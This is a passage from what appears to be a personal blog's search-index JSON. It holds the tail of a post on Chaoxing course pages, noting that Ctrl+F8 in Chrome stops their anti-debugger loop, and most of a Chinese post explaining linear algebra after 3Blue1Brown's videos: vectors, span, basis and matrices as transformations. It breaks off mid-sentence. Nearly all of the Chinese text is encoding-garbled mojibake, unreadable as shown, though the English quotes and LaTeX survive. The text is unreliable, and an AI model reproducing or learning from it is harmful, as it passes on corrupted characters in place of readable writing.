2019-10-18æ›´æ–°ç›®å‰éƒ¨åˆ†è¯¾ç¨‹ç½‘ç«™æ·»åŠ äº†å‰ç«¯åè°ƒè¯•ï¼Œè¡¨ç°ä¸ºé¡µé¢ä¸æ–­debuggerï¼ŒChromeåªéœ€Ctrl + F8ç¦æ­¢æ–­ç‚¹å³å¯ã€‚","categories":[],"tags":[{"name":"something useful","slug":"something-useful","permalink":"https://mundi-xu.github.io/tags/something-useful/"},{"name":"è¶…æ˜Ÿå­¦ä¹ é€š","slug":"è¶…æ˜Ÿå­¦ä¹ é€š","permalink":"https://mundi-xu.github.io/tags/%E8%B6%85%E6%98%9F%E5%AD%A6%E4%B9%A0%E9%80%9A/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://mundi-xu.github.io/tags/JavaScript/"}]},{"title":"çº¿æ€§ä»£æ•°çš„æœ¬è´¨ï¼ˆæ›´æ–°ä¸­ï¼‰","slug":"çº¿æ€§ä»£æ•°çš„æœ¬è´¨","date":"2019-06-30T08:21:00.000Z","updated":"2021-03-11T08:12:59.460Z","comments":true,"path":"2019/06/30/çº¿æ€§ä»£æ•°çš„æœ¬è´¨/","link":"","permalink":"https://mundi-xu.github.io/2019/06/30/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%9A%84%E6%9C%AC%E8%B4%A8/","excerpt":"å°†åªåœç•™åœ¨æ•°å€¼è¿ç®—å’Œå…¬å¼çš„çº¿æ€§ä»£æ•°ä¸å¯è§†åŒ–å‡ ä½•ç»“åˆï¼Œæ•´ç†è‡ª3Blue1Brownçš„ç³»åˆ—è§†é¢‘ã€‚","text":"åºè¨€ There is hardly any theory which is more elementary than linear algebra, in spite of the fact that generations of professors and textbook writers have obscured its simplicity by preposterous calculations with matrices.å°½ç®¡ä¸€æ‰¹æ•™æˆå’Œæ•™ç§‘ä¹¦ä½œè€…ç”¨å…³äºçŸ©é˜µçš„è’è°¬è®¡ç®—æ©ç›–äº†çº¿æ€§ä»£æ•°çš„ç®€æ˜æ€§ï¼Œä½†é²œæœ‰æ¯”ä¹‹æ›´åŸºæœ¬çš„ç†è®ºã€‚ å°†åªåœç•™åœ¨æ•°å€¼è¿ç®—å’Œå…¬å¼çš„çº¿æ€§ä»£æ•°ä¸å¯è§†åŒ–å‡ ä½•ç›´è§‚ï¼ˆVisual Geometric Intuitionï¼‰ç»“åˆï¼Œæ•´ç†è‡ª3Blue1Brownçš„ç³»åˆ—è§†é¢‘ã€‚å†…å®¹æ¶‰åŠåˆ°å‘é‡ï¼Œçº¿æ€§å˜æ¢ï¼Œè¡Œåˆ—å¼ï¼Œé€†çŸ©é˜µï¼Œç‚¹ç§¯ä¸å‰ç§¯ï¼Œç‰¹å¾å‘é‡ä¸ç‰¹å¾å€¼ç­‰ï¼Œä»¥åŠäºŒæ¬¡å‹ï¼Œç›¸ä¼¼çŸ©é˜µç­‰è¡¥å……å†…å®¹ã€‚ æˆ‘ä»¬ä¸ºä»€ä¹ˆéœ€è¦å‡ ä½•ç›´è§‚åœ¨å¼€å§‹ä¹‹å‰ï¼Œæƒ³è±¡å­¦ä¹ ä¸€ä¸ªäº‹ç‰©ï¼ˆæ¦‚å¿µï¼‰çš„åœºæ™¯ï¼šæˆ‘ä»¬éœ€è¦å­¦ä¹ æ­£å¼¦å‡½æ•° $\\sin (x)$ ï¼Œéå¸¸ä¸å¹¸çš„æ˜¯ï¼Œä½ é‡åˆ°çš„æ•™æå‘Šè¯‰ä½ ï¼Œæ­£å¼¦å‡½æ•°æ˜¯è¿™æ ·çš„ï¼š $\\sin (x) = x - \\frac{x^3}{3!} + \\frac{x^5}{5!} + \\cdots + (-1)^n\\frac{x^{2n+1}}{(2n+1)!} + \\cdots$ çœ‹ä¸Šå»å¾ˆå‰å®³çš„æ ·å­ï¼Œå¹¶ä¸”è®¡ç®—æœºä¹Ÿçš„ç¡®æ˜¯è¿™ä¹ˆè®¡ç®— $\\sin (x)$ çš„ï¼Œè€Œå¯¹ä½ æ¥è¯´ï¼Œè®¡ç®—$\\sin (\\frac{\\pi}{6})$å¯èƒ½å°±æ˜¯æŠŠ $x= \\frac{\\pi}{6}$ ä»£å…¥å…¬å¼ï¼Œç„¶åç¥å¥‡çš„å‘ç°ç»“æœè¶Šç®—è¶Šæ¥è¿‘0.5 ï¼Œæ­¤æ—¶ä½ å¯¹$\\sin (x)$ä¸ä¸‰è§’å½¢ä¹‹é—´çš„å‡ ä½•ç›´è§‚åªæœ‰ä¸€äº›æ¨¡ç³Šçš„æ¦‚å¿µï¼Œè¿™æ ·çš„å­¦ä¹ å°±ååˆ†æ‚²å‚¬äº†ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå†å‡è®¾ä¸€ä¸ªåœºæ™¯ï¼šåœ¨å­¦å®Œ$\\sin (x)$å‡½æ•°åï¼Œä½ åˆå»å‚åŠ äº†ä¸€ä¸ªç‰©ç†è¯¾ç¨‹ï¼Œæ­£å¼¦å‡½æ•°éšå¤„å¯è§ï¼Œå…¶ä»–äººå¾ˆå¿«å°±èƒ½çŸ¥é“å¦‚ä½•ä½¿ç”¨å®ƒå¹¶èƒ½å¾—å‡ºå¤§æ¦‚å€¼ï¼Œè€Œåˆšå­¦å®Œæ­£å¼¦å‡½æ•°çš„ä½ å†…å¿ƒæˆå¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼šè¿™ç¾¤å­¦ç‰©ç†çš„è„‘å­ä¹Ÿå¤ªå¼ºäº†ï¼ å…¶å®ï¼Œä½ éœ€è¦åªæ˜¯ä¸€ä¸ªå‡ ä½•ç›´è§‚çš„çŒè¾“è€Œå·²ï¼Œè¿™ä¹Ÿä»ä¾§é¢ä½è¯äº†ä¸€ä¸ªå¥½çš„è€å¸ˆæˆ–æ•™æï¼ˆè¿™é‡Œçš„å¥½è€å¸ˆçœŸçš„ä¸æ˜¯ä»–æœ¬èº«çš„å­¦æœ¯èƒ½åŠ›æœ‰å¤šå¼ºï¼Œè€Œåœ¨äºä»–æ“…ä¸æ“…é•¿ç«™åœ¨å­¦ä¹ è€…çš„è§’åº¦ä¸æ–­çš„ä¿®æ­£æ•™å­¦æ–¹æ³•ï¼‰æ˜¯æœ‰å¤šä¹ˆé‡è¦ã€‚ æ•™å­¦ä¸åŒå±‚æ¬¡çš„äººï¼šåˆå­¦ã€å…¥é—¨ã€æŒæ¡ã€ç†è§£ï¼Œè§£é‡Šçš„è§’åº¦ï¼Œæ–¹å¼éƒ½å®Œå…¨ä¸åŒã€‚æ›´åŠ ä¸å¹¸çš„æ˜¯ï¼Œä¸ºäº†èƒ½æ›´åŠ é€šç”¨çš„ç”¨ç†è®ºæ¥æè¿°ç°å®ç”Ÿæ´»ä¸­çš„è§„å¾‹ï¼Œäººç±»å·²ç»åšäº†å¾ˆå¤šå·¥ä½œï¼Œæˆ‘ä»¬å¸¸è¯´ï¼šè¶Šé€šç”¨ï¼Œè¶ŠæŠ½è±¡ï¼Œè¿™å¯¹äºåˆå­¦è€…æ¥è¯´å ªç§°ä¸€æ®µå™©æ¢¦ã€‚ ä¸Šè¿°ä¾‹å­å¯èƒ½æ¯”è¾ƒæç«¯ï¼Œä½†åªä¸ºå¼ºè°ƒä¸€ä»¶äº‹ï¼šç›´è§‚ç†è§£å¾ˆé‡è¦ï¼Œæˆ–è€…è¯´ï¼Œå­¦ä¹ æ–¹æ³•å¾ˆé‡è¦ã€‚å¥½çš„å­¦ä¹ æ–¹æ³•å³ä½ å¦‚ä½•ç›´è§‚çš„å»ç†è§£ï¼ˆå¯èƒ½æ˜¯å‡ ä½•çš„ï¼Œæˆ–æ˜¯ç°å®ä¸­çš„å…·ä½“ä¾‹å­ï¼‰ä¸€ä¸ªæŠ½è±¡çš„äº‹ç‰©ï¼Œå¹¶å±‚æ¬¡åŒ–çš„å»ºç«‹çŸ¥è¯†ä¸çŸ¥è¯†é—´çš„è”ç³»ï¼Œæ„å»ºå¹¶å¥å£®å±äºè‡ªå·±çš„çŸ¥è¯†å›¾è°±ã€‚ä¸ªäººè§‚ç‚¹æ˜¯ï¼Œè¿™ç§å­¦ä¹ æ–¹æ³•æ˜¯æœ€é«˜æ•ˆçš„ã€‚å®ƒå”¯ä¸€çš„è¦æ±‚åœ¨äºï¼Œéœ€è¦ä¸€å®šçš„åŸºç¡€çŸ¥è¯†æ‰“åº•ï¼Œä¸€å®šçš„é‡å˜ç»“åˆæ–¹æ³•è®ºï¼ˆç‚¹æ‹¨æˆ–é¢†æ‚Ÿï¼‰å°±æ˜¯è´¨å˜ã€‚ å‘é‡ç©¶ç«Ÿæ˜¯ä»€ä¹ˆ The introduction of numbers as coordinates is an act of violence.å¼•å…¥ä¸€äº›æ•°ä½œä¸ºåæ ‡æ˜¯ä¸€ç§é²è½çš„è¡Œä¸ºã€‚ ä¸åŒè§†è§’ä¸‹çš„å‘é‡å¯¹äºå‘é‡çš„è¿™ä¸ªæ¦‚å¿µï¼Œå¤§å®¶ä¸€å®šå¹¶ä¸é™Œç”Ÿï¼Œä½†æ˜¯è¿™æ¬¡è®©æˆ‘ä»¬ä»æ•°å­¦ï¼Œç‰©ç†ï¼Œè®¡ç®—æœºä¸‰ä¸ªè§’åº¦æ¥çœ‹å¾…å¦‚ä½•å®šä¹‰è¿™ä¸ªå‘é‡è¿™ä¸ªæ¦‚å¿µã€‚ ç‰©ç†ä¸“ä¸šè§’åº¦ å‘é‡æ˜¯ç©ºé—´ä¸­çš„ç®­å¤´ å†³å®šä¸€ä¸ªå‘é‡çš„æ˜¯ï¼šå®ƒçš„é•¿åº¦å’Œå®ƒæ‰€æŒ‡çš„æ–¹å‘ è®¡ç®—æœºä¸“ä¸šè§’åº¦ å‘é‡æ˜¯æœ‰åºçš„æ•°å­—åˆ—è¡¨ å‘é‡ä¸è¿‡æ˜¯â€œåˆ—è¡¨â€ä¸€ä¸ªèŠ±å“¨çš„è¯´æ³• å‘é‡çš„ç»´åº¦ç­‰äºâ€œåˆ—è¡¨â€çš„é•¿åº¦ æ•°å­¦ä¸“ä¸šè§’åº¦å¯¹æ•°å­¦æ¥è¯´ï¼Œå®ƒçš„æœ¬è´¨å°±æ˜¯é€šç”¨å’ŒæŠ½è±¡ï¼Œæ‰€ä»¥ï¼Œæ•°å­¦å®¶å¸Œæœ›æ¦‚æ‹¬è¿™ä¸¤ç§è§‚ç‚¹: å‘é‡å¯ä»¥æ˜¯ä»»ä½•ä¸œè¥¿ï¼Œåªéœ€è¦ä¿è¯ï¼šä¸¤ä¸ªå‘é‡ç›¸åŠ åŠæ•°å­—ä¸å‘é‡ç›¸ä¹˜æœ‰æ„ä¹‰ å‘é‡åŠ æ³•å’Œå‘é‡ä¹˜æ³•è´¯ç©¿çº¿æ€§ä»£æ•°å§‹ç»ˆï¼Œååˆ†é‡è¦ å¯ä»¥é€šè¿‡ä¸Šå›¾ç›´è§‚çš„æ„Ÿå—åˆ°æ•°å­¦å®¶åœ¨æƒ³ä»€ä¹ˆã€‚å·¦è¾¹æ˜¯ç‰©ç†è§’åº¦ï¼Œå³è¾¹æ˜¯è®¡ç®—æœºè§’åº¦ï¼Œä½†æ˜¯å¾ˆæŠ±æ­‰ï¼Œæˆ‘èƒ½ç”¨ä¸€äº›æŠ½è±¡çš„å®šä¹‰å’Œçº¦æŸè®©ä½ ä»¬å˜æˆä¸€ä¸ªä¸œè¥¿ã€‚ åæ ‡ç³»æŠŠå‘é‡ç½®äºåæ ‡ç³»ä¸­ï¼Œä»¥åŸç‚¹ä¸ºèµ·ç‚¹ï¼Œåæ ‡æ­£è´Ÿè¡¨ç¤ºæ–¹å‘ï¼Œå¯å®Œç¾æŠŠä¸¤ä¸ªä¸åŒçš„è§’åº¦èåˆã€‚ å‘é‡åŠ æ³• ç‰©ç†ï¼šé¦–å°¾ç›¸è¿ (Motion) è®¡ç®—æœºï¼šåæ ‡ç›¸åŠ  å‘é‡ä¹˜æ³• ç‰©ç†ï¼šç¼©æ”¾ (Scaling) è®¡ç®—æœºï¼šåæ ‡å’Œæ¯”ä¾‹ç›¸ä¹˜ å®é™…ä¸Šæ— è®ºä½ æ€ä¹ˆçœ‹å¾…å‘é‡éƒ½æ— æ‰€è°“ï¼Œæˆ–æŠŠå‘é‡çœ‹ä½œç©ºé—´ä¸­çš„ç®­å¤´ï¼Œæˆ–æŠŠå‘é‡çœ‹ä½œæ•°å­—åˆ—è¡¨ï¼Œçº¿æ€§ä»£æ•°çš„æ•ˆç”¨å¾ˆå°‘ä½“ç°åœ¨è¿™äº›è§‚ç‚¹ä¸­çš„å…¶ä¸­ä¸€ä¸ªä¸Šï¼Œè€Œæ˜¯æ›´å¤šçš„ä½“ç°åœ¨å®ƒèƒ½å¤Ÿåœ¨è¿™äº›è§‚ç‚¹ä¸­äº’ç›¸è½¬åŒ–ã€‚çº¿æ€§ä»£æ•°ä¸ºæ•°æ®åˆ†ææä¾›äº†ä¸€æ¡å°†å¤§é‡æ•°æ®åˆ—è¡¨æ¦‚å¿µåŒ–ã€å¯è§†åŒ–çš„æ¸ é“ï¼Œå®ƒèƒ½è®©æ•°æ®æ ·å¼å˜å¾—éå¸¸æ˜æ™°ï¼Œå¹¶è®©ä½ å¤§è‡´äº†è§£å…¶ç‰¹å®šè¿ç®—çš„æ„ä¹‰ã€‚åŒæ—¶ï¼Œçº¿æ€§ä»£æ•°ç»™ç‰©ç†å­¦å®¶å’Œè®¡ç®—æœºå›¾å½¢ç¨‹åºå‘˜æä¾›äº†ä¸€ç§æ–¹æ³•å»é€šè¿‡è®¡ç®—æœºèƒ½å¤„ç†çš„æ•°å­—æ¥æè¿°å¹¶æ“çºµç©ºé—´ï¼ˆä¾‹å¦‚Mathematical Animation Engine)ã€‚ çº¿æ€§ç»„åˆã€åŸºä¸å…¶å¼ æˆçš„ç©ºé—´ Mathematics requires a small dose, not of genius, but of an imaginative freedom which, in a larger dose, would be insanity.æ•°å­¦éœ€è¦çš„ä¸æ˜¯å¤©èµ‹ï¼Œè€Œæ˜¯å°‘é‡çš„è‡ªç”±æƒ³è±¡ï¼Œä½†æƒ³è±¡å¤ªè¿‡è‡ªç”±åˆä¼šé™·å…¥ç–¯ç‹‚ã€‚ æœ¬éƒ¨åˆ†ç»§ç»­åŠ æ·±ä¸€ä¸ªæ¦‚å¿µï¼Œä¸ºä½•å‘é‡åŠ æ³•ä¸å‘é‡ä¹˜æ³•æ˜¯é‚£ä¹ˆé‡è¦ï¼Œå¹¶ä»å§‹è‡³ç»ˆè´¯ç©¿æ•´ä¸ªçº¿æ€§ä»£æ•°ï¼ˆå…³äºåé¢çš„ç›´è§‚è§£é‡Šéƒ¨åˆ†ï¼Œå¼ºçƒˆå»ºè®®å»åŸè§†é¢‘è§‚çœ‹åŠ¨ç”»æ¼”ç¤ºï¼‰ã€‚ çº¿æ€§ç»„åˆäºŒç»´ç©ºé—´ä¸­ä»»æ„ä¸¤ä¸ªä¸å…±çº¿çš„éé›¶å‘é‡éƒ½å¯ä»¥è¡¨ç¤ºè¯¥ç©ºé—´ä¸­çš„ä»»æ„ä¸€ä¸ªå‘é‡ï¼Œå†™æˆç¬¦å·è¯­è¨€å°±æ˜¯ï¼š $a \\mathbf{\\vec v} + b \\mathbf{\\vec w}$ ã€‚ è‡³äºä¸ºä»€ä¹ˆè¢«ç§°ä¸ºâ€œçº¿æ€§â€ï¼Œæœ‰ä¸€ç§å‡ ä½•ç›´è§‚ï¼šå¦‚æœä½ å›ºå®šå…¶ä¸­ä¸€ä¸ªæ ‡é‡ï¼Œè®©å¦ä¸€ä¸ªæ ‡é‡è‡ªç”±å˜åŒ–ï¼Œæ‰€äº§ç”Ÿçš„å‘é‡ç»ˆç‚¹ä¼šæå‡ºä¸€æ¡ç›´çº¿ã€‚ï¼ˆè¿™é‡Œå…¶å®å¾ˆä¸ä¸¥è°¨ï¼Œå…·ä½“å®šä¹‰è¯·å‚é˜…è¯¾æœ¬ã€‚ï¼‰ ç©ºé—´çš„åŸº (Basis)å¯¹äºæˆ‘ä»¬å¸¸è§çš„ç¬›å¡å°”åæ ‡ç³»ï¼Œæœ‰ä¸€ç»„æœ€ç›´è§‚çš„åŸºï¼š${ \\hat{\\imath},{\\hat{\\jmath}} }$ï¼Œå³å•ä½å‘é‡ $\\hat{\\imath}=(1,0)$ å’Œ $\\hat{\\jmath}=(0,1)$,é€šè¿‡$\\hat{\\imath}$å’Œ${\\hat{\\jmath}}$çš„æ‹‰ä¼¸ä¸ç›¸åŠ å¯ä»¥ç»„æˆç¬›å¡å°”åæ ‡ç³»ä¸­çš„ä»»æ„ä¸€ä¸ªå‘é‡ã€‚ï¼ˆä¸Šè¿°çš„ä»»æ„ä¸¤ä¸ªä¸å…±çº¿çš„éé›¶å‘é‡ä¹Ÿå¯ä»¥ä½œä¸ºäºŒç»´ç©ºé—´çš„ä¸€ç»„åŸºã€‚ï¼‰ å¼ æˆçš„ç©ºé—´ (Span)åŒç†ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©ä¸åŒçš„åŸºå‘é‡ï¼Œè€Œè¿™äº›åŸºå‘é‡æ„æˆçš„ç©ºé—´å°±ç§°ä¸ºå…¶å¼ æˆçš„ç©ºé—´ã€‚å¼ æˆäºŒå­—æ¯”è¾ƒæ‹—å£ï¼Œå¯ä»¥ç±»æ¯”ä¸ºå»¶ä¼¸æˆ–æ‰©å±•ã€‚ç›´è§‚æ¥çœ‹ï¼Œå°±æ˜¯æœ¬æ–‡æ‰€æœ‰å›¾ä¸­çš„ç½‘æ ¼ã€‚ç¬›å¡å°”åæ ‡ç³»å°±æ˜¯ä¸€ä¸ªç”±å•ä½åæ ‡${ \\hat{\\imath},{\\hat{\\jmath}} }$å¼ æˆçš„ç©ºé—´ï¼ˆåŒæ—¶ä¹Ÿæ˜¯ä¸Šè¿°ä»»æ„ä¸¤ä¸ªä¸å…±çº¿çš„éé›¶å‘é‡æ‰€å¼ æˆçš„ç©ºé—´ï¼‰ã€‚æ‰€æœ‰å¯ä»¥è¡¨ç¤ºä¸ºç»™å®šå‘é‡ï¼ˆåŸºï¼‰çº¿æ€§ç»„åˆï¼ˆåˆšåˆšè®²äº†è¿™ä¸ªæ¦‚å¿µï¼‰çš„å‘é‡çš„é›†åˆï¼Œè¢«ç§°ä¸ºç»™å®šå‘é‡ï¼ˆåŸºï¼‰å¼ æˆçš„ç©ºé—´ã€‚ å¦‚æœä½ ç»§ç»­æ€è€ƒä¸€ä¸‹ï¼Œä¼šå‘ç°ä¸€ä¸ªç‰¹ç‚¹ï¼š**å¹¶ä¸æ˜¯æ¯ä¸€ç»„ç»™å®šå‘é‡éƒ½å¯ä»¥å¼ æˆä¸€ä¸ªç©ºé—´**ï¼Œè‹¥è¿™ä¸¤ä¸ªå‘é‡å…±çº¿ï¼ˆ2Dï¼‰ï¼Œå…±é¢ï¼ˆ3Dï¼‰ï¼Œå®ƒä»¬å°±åªèƒ½è¢«é™åˆ¶åœ¨ä¸€ä¸ªç›´çº¿æˆ–é¢ä¸­ï¼Œç±»ä¼¼äºâ€œé™ç»´æ‰“å‡»â€ï¼ˆè¿™ä¹Ÿæ˜¯æˆ‘å¼ºè°ƒä¸å…±çº¿ä¸”å‘é‡éé›¶çš„åŸå› ï¼‰ã€‚é€šè¿‡è¿™ä¸ªç›´è§‚çš„æ€è€ƒå¯ä»¥å¼•å‡ºä»¥ä¸‹æ¦‚å¿µï¼š çº¿æ€§ç›¸å…³å…³äºä»€ä¹ˆæ˜¯çº¿æ€§ç›¸å…³ï¼Œæœ‰ä¸¤ç§è¡¨è¾¾ï¼š ä½ æœ‰å¤šä¸ªå‘é‡ï¼Œå¹¶ä¸”å¯ä»¥ç§»é™¤å…¶ä¸­ä¸€ä¸ªè€Œä¸å‡å°å¼ æˆçš„ç©ºé—´ï¼ˆå³2Då…±çº¿æˆ–3Då…±é¢ï¼‰ï¼Œæˆ‘ä»¬ç§°å®ƒä»¬ï¼ˆè¿™äº›å‘é‡ï¼‰çº¿æ€§ç›¸å…³ã€‚ å…¶ä¸­ä¸€ä¸ªå‘é‡ï¼Œå¯ä»¥è¡¨ç¤ºä¸ºå…¶ä»–å‘é‡çš„çº¿æ€§ç»„åˆï¼Œå› ä¸ºè¿™ä¸ªå‘é‡å·²ç»è½åœ¨å…¶ä»–å‘é‡å¼ æˆçš„ç©ºé—´ä¹‹ä¸­ã€‚ ä»ç»Ÿè®¡å­¦è§’åº¦æ¥è¯´ï¼Œå°±æ˜¯æŒ‡è¿™äº›å‘é‡ä¹‹ä¸­æœ‰å†—ä½™ã€‚å³åœ¨è¿™ä¸€å †å‘é‡ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦å…¶ä¸­å‡ ä¸ªï¼ˆå–å†³äºç»´åº¦ï¼‰å°±å¯ä»¥è¡¨ç¤ºæ‰€æœ‰å…¶ä»–çš„å‘é‡ã€‚ç”±æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºä»¥ä¸‹éƒ¨åˆ†ï¼š å‘é‡ç©ºé—´ä¸­ä¸€ç»„åŸºçš„ä¸¥æ ¼å®šä¹‰å‘é‡ç©ºé—´çš„ä¸€ç»„åŸºæ˜¯å¼ æˆè¯¥ç©ºé—´çš„ä¸€ä¸ªçº¿æ€§æ— å…³å‘é‡é›†ã€‚ åœ¨çº¿æ€§ä»£æ•°ä¸­ï¼ŒåŸº(basis)ï¼ˆä¹Ÿç§°ä¸ºåŸºåº•ï¼‰æ˜¯æè¿°ã€åˆ»ç”»å‘é‡ç©ºé—´çš„åŸºæœ¬å·¥å…·ã€‚å‘é‡ç©ºé—´çš„åŸºæ˜¯å®ƒçš„ä¸€ä¸ªç‰¹æ®Šçš„å­é›†ï¼ŒåŸºçš„å…ƒç´ ç§°ä¸ºåŸºå‘é‡ã€‚å‘é‡ç©ºé—´ä¸­ä»»æ„ä¸€ä¸ªå…ƒç´ ï¼Œéƒ½å¯ä»¥å”¯ä¸€åœ°è¡¨ç¤ºæˆåŸºå‘é‡çš„çº¿æ€§ç»„åˆã€‚å¦‚æœåŸºä¸­å…ƒç´ ä¸ªæ•°æœ‰é™ï¼Œå°±ç§°å‘é‡ç©ºé—´ä¸ºæœ‰é™ç»´å‘é‡ç©ºé—´ï¼Œå°†å…ƒç´ çš„ä¸ªæ•°ç§°ä½œå‘é‡ç©ºé—´çš„ç»´æ•°ã€‚ ä½¿ç”¨åŸºåº•å¯ä»¥ä¾¿åˆ©åœ°æè¿°å‘é‡ç©ºé—´ã€‚ ç”¨è¿™æ ·çš„æ­¥éª¤æ¥æ…¢æ…¢å¯¼å‡ºè¿™ä¸ªå®šä¹‰ï¼Œä¸ªäººæ„Ÿè§‰ï¼Œè¿œæ¯”åœ¨è¯¾å ‚çš„ç¬¬ä¸€åˆ†é’Ÿå°±å°†è¿™å¥è®©ä½ è¿·æƒ‘çš„è¯ä¸¢ç»™ä½ å¥½çš„å¤šï¼ŒæŠ½è±¡çš„ä¸œè¥¿åªæœ‰åœ¨æ…¢æ…¢æ¨å€’ä¸­ä½ æ‰èƒ½å‘ç°å®ƒçš„ç²¾å·§ä¹‹å¤„ï¼Œéå¸¸ä¼˜é›…ä¸”è¿·äººã€‚ çŸ©é˜µä¸çº¿æ€§å˜æ¢ Unfortunately, no one can be told what the Matrix is. You have to see it for yourself.å¾ˆé—æ†¾ï¼ŒçŸ©é˜µæ˜¯ä»€ä¹ˆæ˜¯è¯´ä¸æ¸…çš„ã€‚ä½ å¿…é¡»å¾—è‡ªå·±äº²çœ¼çœ‹çœ‹ã€‚ çŸ©é˜µï¼Œæœ€ç›´è§‚çš„ç†è§£å½“ç„¶æ˜¯ä¸€ä¸ªå†™æˆæ–¹é˜µçš„æ•°å­— $\\begin{pmatrix}1&amp;0 \\\\ 0&amp;1 \\end{pmatrix}$ï¼Œè¿™å‡ èŠ‚çš„æ ¸å¿ƒæ˜¯ä¸ºäº†è¯´æ˜ï¼šçŸ©é˜µå…¶å®å°±æ˜¯ä¸€ç§å‘é‡å˜æ¢ï¼ˆè‡³äºä»€ä¹ˆæ˜¯å˜æ¢ä¸‹é¢ä¼šè®²ï¼‰ï¼Œå¹¶é™„å¸¦ä¸€ç§ä¸ç”¨æ­»è®°ç¡¬èƒŒçš„è€ƒè™‘çŸ©é˜µå‘é‡ä¹˜æ³•çš„æ–¹æ³•ã€‚ å˜æ¢å˜æ¢æœ¬è´¨ä¸Šæ˜¯å‡½æ•°ï¼ˆä¸‹å·¦å›¾ï¼‰çš„ä¸€ç§èŠ±å“¨çš„è¯´æ³•ï¼Œå®ƒæ¥å—è¾“å…¥å†…å®¹ï¼Œå¹¶è¾“å‡ºå¯¹åº”ç»“æœï¼Œç‰¹åˆ«çš„ï¼Œåœ¨çŸ©é˜µå˜æ¢ï¼ˆä¸‹å³å›¾ï¼‰ä¸­ï¼Œæˆ‘ä»¬æ¥å—ä¸€ä¸ªå‘é‡å¹¶ä¸”è¾“å‡ºå¦ä¸€ä¸ªå‘é‡ã€‚ é‚£æ—¢ç„¶å˜æ¢å’Œå‡½æ•°æ„ä¹‰ç›¸åŒï¼Œä¸ºä»€ä¹ˆè¦ç”¨å¤šä½™çš„æœ¯è¯­å›°æƒ‘æˆ‘ä»¬å‘¢ï¼Ÿå› ä¸ºä½¿ç”¨å˜æ¢æ˜¯åœ¨æš—ç¤ºä»¥ç‰¹å®šæ–¹å¼æ¥å¯è§†åŒ–è¿™ä¸€è¾“å…¥$\\to$è¾“å‡ºå…³ç³»ã€‚ä¸€ç§ç†è§£â€œå‘é‡çš„å‡½æ•°â€çš„æ–¹æ³•å°±æ˜¯å°±æ˜¯ä½¿ç”¨è¿åŠ¨ã€‚ è¿™ä¸–ç•Œä¸Šæœ‰éå¸¸å¤šä¼˜ç¾çš„å˜æ¢ï¼Œå¦‚æœä½ å°†ä»–ä»¬å¯è§†åŒ–ï¼Œå°±èƒ½å¾—åˆ°ä¸‹å›¾ï¼š çº¿æ€§å˜æ¢æˆ‘ä»¬è¯´å…·æœ‰ä»¥ä¸‹ä¸¤ä¸ªæ€§è´¨çš„å°±æ˜¯çº¿æ€§å˜æ¢ï¼ˆç›´è§‚å¯è§†åŒ–å¦‚ä¸‹å›¾ï¼‰ï¼š ç›´çº¿åœ¨å˜æ¢åä»ç„¶ä¿æŒä¸ºç›´çº¿ï¼Œä¸èƒ½æœ‰æ‰€å¼¯æ›²ã€‚ åŸç‚¹å¿…é¡»ä¿æŒå›ºå®š ç”¨ä¸€å¥è¯æ€»ç»“å°±æ˜¯ï¼šçº¿æ€§å˜æ¢æ˜¯ä¿æŒç½‘æ ¼çº¿å¹³è¡Œä¸”ç­‰è·åˆ†å¸ƒçš„å˜æ¢ï¼ˆå¦‚æœå˜æ¢åä¿æŒç›´çº¿ä¸å˜ä½†åŸç‚¹æ”¹å˜åˆ™ä¸ºä»¿å°„å˜æ¢ï¼Œå³çº¿æ€§å˜æ¢+å¹³ç§»ï¼‰ã€‚ å¦‚ä½•ç”¨æ•°å€¼æè¿°çº¿æ€§å˜æ¢è¿™é‡Œéœ€è¦ä½¿ç”¨ä¸Šä¸€èŠ‚æåˆ°çš„å·¥å…·ï¼Œç©ºé—´çš„åŸºï¼Œä¹Ÿå°±æ˜¯å•ä½å‘é‡ï¼ˆåŸºå‘é‡ï¼‰ï¼š$\\hat{\\imath}=(1,0)$ å’Œ $\\hat{\\jmath}=(0,1)$ å¯¹çº¿æ€§å˜æ¢ï¼Œæˆ‘ä»¬åªéœ€è¦å…³æ³¨ä¸¤ä¸ªåŸºå‘é‡ $\\hat{\\imath}$ å’Œ $\\hat{\\jmath}$å˜æ¢åçš„ä½ç½®å³å¯ã€‚ä¾‹å¦‚ï¼Œ$\\hat{\\imath}$ å˜æ¢åˆ°$(3,1)$çš„ä½ç½®ï¼Œ$\\hat{\\jmath}$ å˜æ¢åˆ°$(1,2)$çš„ä½ç½®,å°†$\\hat{\\imath}$å˜æ¢åçš„åæ ‡ç«–èµ·æ¥ä½œä¸ºæ–¹é˜µçš„ç¬¬ä¸€åˆ—ï¼ˆç»¿è‰²è¡¨ç¤ºï¼‰ï¼Œ$\\hat{\\jmath}$å˜æ¢åçš„åæ ‡ç«–èµ·æ¥ä½œä¸ºæ–¹é˜µçš„ç¬¬äºŒåˆ—ï¼ˆçº¢è‰²è¡¨ç¤ºï¼‰ï¼Œå¾—åˆ°çŸ©é˜µ$\\begin{pmatrix}\\color{green}3&amp;\\color{red}1 \\\\ \\color{green}1&amp;\\color{red}2 \\end{pmatrix}$ã€‚å‡è®¾æˆ‘ä»¬æƒ³è¦çŸ¥é“ç›®æ ‡å‘é‡$(-1,2)$è¿›è¡Œå˜æ¢åçš„ä½ç½®ï¼Œé‚£ä¹ˆè¿™ä¸ªçŸ©é˜µå°±æ˜¯å¯¹å˜æ¢è¿‡ç¨‹æœ€å¥½çš„æè¿°ï¼Œä¸€å›¾èƒœåƒè¨€ã€‚ Step1ï¼š ç»¿è‰²$\\hat{\\imath}$ï¼ˆxè½´ï¼‰è¿›è¡Œç§»åŠ¨ï¼ˆå˜æ¢ï¼‰ Step2ï¼š çº¢è‰²$\\hat{\\jmath}$ï¼ˆyè½´ï¼‰è¿›è¡Œç§»åŠ¨ï¼ˆå˜æ¢ï¼‰ Step3ï¼š ç›®æ ‡å‘é‡xè½´åæ ‡å€¼ä¸$\\hat{\\imath}$å˜æ¢åå‘é‡è¿›è¡Œå‘é‡ä¹˜æ³• Step4ï¼š ç›®æ ‡å‘é‡yè½´åæ ‡å€¼ä¸$\\hat{\\jmath}$å˜æ¢åå‘é‡è¿›è¡Œå‘é‡ä¹˜æ³• Step5ï¼š ä¸¤è€…è¿›è¡Œå‘é‡åŠ 